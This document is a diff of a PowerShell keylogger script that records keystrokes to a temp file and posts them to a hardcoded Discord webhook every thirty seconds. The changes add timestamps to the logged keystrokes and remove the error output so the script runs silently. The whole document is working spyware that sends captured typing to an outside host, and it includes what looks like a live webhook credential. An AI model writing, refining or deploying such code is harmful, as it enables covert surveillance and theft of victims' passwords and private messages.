@@ -1,3 +1,4 @@
+
 $discordWebhookUrl = "https://discord.com/api/webhooks/1287792319067721779/wvStZi9TsQ45RyDIXwxA4XeuQyDDgxQErSpsAaVmjHaszH6VWO4RhUlD7id8JPIMRn_K"
 $keylogFilePath = "$env:temp\keylogs.txt"
 
@@ -27,7 +28,6 @@ function Send-DiscordMessage {
         Invoke-WebRequest -Uri $discordWebhookUrl -Method Post -ContentType "application/json" -Body $body
     }
     catch {
-        Write-Host "Error occurred: $_"
     }
 }
 
@@ -37,10 +37,11 @@ function LogKeystrokesToFile {
     )
 
     try {
-        Add-Content -Path $keylogFilePath -Value $Content -Encoding UTF8
+        $timestamp = Get-Date -Format "HH:mm:ss"
+        $formattedContent = "[$timestamp] $Content"
+        Add-Content -Path $keylogFilePath -Value $formattedContent -Encoding UTF8
     }
     catch {
-        Write-Host "Error occurred: $_"
     }
 }
 
@@ -48,14 +49,14 @@ function SendKeylogsFromFile {
     try {
         if (Test-Path $keylogFilePath) {
             $keylogs = Get-Content -Path $keylogFilePath -Raw
-            Send-DiscordMessage -Content $keylogs
+            $formattedLogs = "Key Logs:`n" + $keylogs -replace '\n', "`n"
+            Send-DiscordMessage -Content $formattedLogs
             Remove-Item -Path $keylogFilePath -Force
         } else {
             Send-DiscordMessage -Content "No keystrokes recorded in the last 30 seconds."
         }
     }
     catch {
-        Write-Host "Error occurred: $_"
     }
 }
 
@@ -115,3 +116,4 @@ function KeyLogger {
 if (-not [System.Diagnostics.Process]::GetProcessesByName("powershell").Where({$_.MainWindowTitle -match 'keylogg.ps1'})) {
     KeyLogger
 }
+
